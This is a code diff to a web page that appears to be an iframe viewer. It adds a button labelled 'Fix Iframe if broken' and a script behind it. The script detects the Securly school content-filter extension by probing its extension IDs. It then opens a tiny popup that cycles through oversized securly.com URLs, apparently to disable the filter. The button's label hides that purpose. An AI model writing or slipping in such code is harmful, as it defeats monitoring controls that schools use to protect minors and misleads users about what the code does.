@@ -31,7 +31,6 @@
       }
     }
   </script>
-  
   <!-- Lucide Icons CDN -->
   <script src="https://unpkg.com/lucide@latest"></script>
 
@@ -94,6 +93,14 @@
         <i data-lucide="layout" class="w-3.5 h-3.5"></i> Direct iFrame
       </button>
     </div>
+    
+    <!-- Fix IFrame button -->
+    <div class="flex items-center bg-slate-950 rounded-lg p-1 border border-slate-800">
+      <button onclick="disable_ext()" id="disable_button" style="display:block" class="px-3 py-1 text-xs font-medium rounded-md text-white flex items-center gap-1.5 transition shadow">
+        Fix Iframe if broken
+      </button>
+    </div>
+    
 
     <!-- VIEWPORT SWITCHER -->
     <div class="hidden lg:flex items-center bg-slate-950 rounded-lg p-1 border border-slate-800 space-x-1">
@@ -1249,6 +1256,70 @@ document.body.style.border = '3px solid #0ea5e9';"></textarea>
       const url = document.getElementById('target-url').value;
       if (url) window.open(url, '_blank');
     }
+          const from_id = (id) => document.getElementById(id);
+      const ext_ids = [
+        "iheobagjkfklnlikgihanlhcddjoihkg",
+        "joflmkccibkooplaeoinecjbmdebglab",
+        "ckecmkbnoanpgplccmnoikfmpcdladkc",
+        "kfiocjonplkilcjfgabfngiddebalkod",
+        "bmlalgfmolfmkjmnikbphgijefopggme"
+      ];
+      const clusters = ["www", "useast-www", "useast2-www", "ca-www", "uk-www"];
+      const param_names = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];
+
+      function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      function detect_ext() {
+        return new Promise((resolve, reject) => {
+          for (let id of ext_ids) {
+            let url = `chrome-extension://${id}/tt-alert.svg`;
+            fetch(url).then(() => resolve(true));
+          }
+          setTimeout(() => resolve(false), 500);
+        });
+      }
+
+      async function disable_ext() {
+        let w = null;
+        let i = 1;
+        let total = clusters.length * param_names.length;
+        for (let cluster of clusters) {
+          for (let param of param_names) {
+            let url = `https://${cluster}.securly.com/please_wait/${i}/${total}?${param}=`;
+            url += "a".repeat(4096 - url.length);
+
+            if (!w) {
+              w = window.open(url, "", "width=400,height=1");
+              await sleep(2000);
+            }
+            else {
+              w.location.href = url;
+              await sleep(2000);
+            }
+            i++;
+          }
+        }
+        w.close();
+      }
+
+      async function main() {
+        from_id("buttons_container").style.display = "flex";
+
+        let ext_detected = await detect_ext();
+        if (!ext_detected) {
+          from_id("status_text").innerText = "Error: You do not appear to have Securly installed.";
+          return;
+        }
+
+        from_id("status_text").style.display = "none";
+        from_id("disable_button").style.display = "block";
+        from_id("disable_button").onclick = disable_ext;
+      }
+      
+      window.onload = main;
   </script>
+          
 </body>
 </html>
